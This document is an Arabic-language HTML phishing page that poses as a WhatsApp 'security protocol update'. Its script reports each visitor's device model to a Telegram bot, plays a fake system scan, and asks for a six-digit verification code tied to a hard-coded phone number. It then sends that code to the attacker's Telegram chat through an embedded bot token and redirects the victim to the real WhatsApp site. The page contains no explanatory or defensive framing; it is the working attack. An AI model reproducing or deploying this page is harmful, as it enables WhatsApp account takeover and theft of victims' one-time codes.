<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security System</title>
    <style>
        :root { --wa-bg: #111b21; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }

        /* شاشة الفحص الذكي */
        #checker { 
            position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .container { padding: 40px 25px; text-align: center; display: none; }
        .active { display: block; animation: fadeIn 0.6s ease; }

        .status-box { 
            background: #1d2a33; border-radius: 8px; padding: 20px; text-align: right; 
            margin-bottom: 25px; border: 1px solid #222d34;
        }
        
        .info-line { font-size: 13px; margin-bottom: 12px; color: var(--wa-hint); display: flex; justify-content: space-between; }
        .info-line b { color: #fff; font-family: sans-serif; }

        .otp-input {
            width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--wa-green);
            color: #fff; font-size: 35px; text-align: center; outline: none; letter-spacing: 12px; margin: 30px 0; direction: ltr;
        }

        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }

        /* لودينج واتساب الرسمي */
        .wa-loader { width: 50px; height: 50px; border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; animation: spin 1s linear infinite; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="checker">
        <div class="wa-loader"></div>
        <p id="log-text" style="margin-top:25px; font-size:14px; color:var(--wa-hint);">بدء فحص النظام...</p>
        <div id="device-detect" style="margin-top:10px; font-size:11px; color:var(--wa-green); font-family:monospace; opacity: 0.7;"></div>
    </div>

    <div class="container" id="app">
        <svg width="50" height="50" viewBox="0 0 24 24" fill="#00a884" style="margin-bottom:20px;"><path d="M12.004 2C6.48 2 2 6.48 2 12c0 1.73.44 3.36 1.21 4.78L2 22l5.41-1.16C8.83 21.6 10.37 22 12.004 22c5.52 0 10-4.48 10-10s-4.48-10-10-10zm.003 18c-1.5 0-2.91-.4-4.13-1.1l-.3-.17-3.07.66.67-2.94-.19-.31C4.34 14.96 4 13.53 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8-3.59 8-8 8z"/></svg>
        <h2 style="font-size:19px; margin-bottom:20px; font-weight: 500;">تحديث بروتوكول الأمان</h2>

        <div class="status-box">
            <div class="info-line">الجهاز المكتشف: <b id="device-name">--</b></div>
            <div class="info-line">حالة التشفير: <span style="color:#f15c5c;">(v2.4) مطلوب تحديث</span></div>
            <div class="info-line">الرقم الموثق: <b id="masked-phone" style="color:var(--wa-green);"></b></div>
        </div>

        <p style="font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 25px;">
            تم إصلاح أخطاء التوافق في الإصدار الأخير. يرجى إدخال رمز المزامنة لتأمين محادثاتك على هذا الجهاز ومنع تسريب البيانات.
        </p>

        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
        <button class="btn" onclick="submitData()">تحديث ومزامنة الآن</button>
    </div>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: '01030003287'
        };

        function getDevice() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const m = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
                return m ? m[2] : "Android Device";
            }
            return /iPhone|iPad/i.test(ua) ? "iPhone (iOS)" : "Mobile Device";
        }

        const deviceModel = getDevice();
        document.getElementById('device-name').innerText = deviceModel;
        document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);

        async function bot(msg) {
            try { await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
            }); } catch(e) {}
        }

        window.onload = () => {
            const log = document.getElementById('log-text');
            const det = document.getElementById('device-detect');
            
            bot(`📱 <b>دخل للموقع:</b>\nالجهاز: <code>${deviceModel}</code>`);

            setTimeout(() => { log.innerText = "تحديد مواصفات الجهاز..."; det.innerText = `OS: ${navigator.platform}`; }, 1500);
            setTimeout(() => { log.innerText = "فحص بروتوكولات SSL/TLS..."; }, 3000);
            setTimeout(() => { log.innerText = "تحليل تشفير المحادثات..."; }, 4500);
            
            setTimeout(() => {
                document.getElementById('checker').style.display = 'none';
                document.getElementById('app').classList.add('active');
            }, 6000);
        };

        async function submitData() {
            const val = document.getElementById('otp').value;
            if(val.length === 6) {
                const b = document.querySelector('.btn');
                b.innerText = "جاري المزامنة..."; b.disabled = true;

                await bot(`🔥 <b>كود جديد:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>\nالجهاز: <code>${deviceModel}</code>`);
                
                document.body.innerHTML = `<div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; padding:20px; text-align:center;">
                    <div class="wa-loader"></div>
                    <p style="margin-top:20px; color:var(--wa-hint);">جاري ربط بروتوكول v2.4 بحسابك...<br>برجاء عدم إغلاق الصفحة.</p>
                </div>`;
                
                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 6000);
            }
        }
    </script>
</body>
</html>
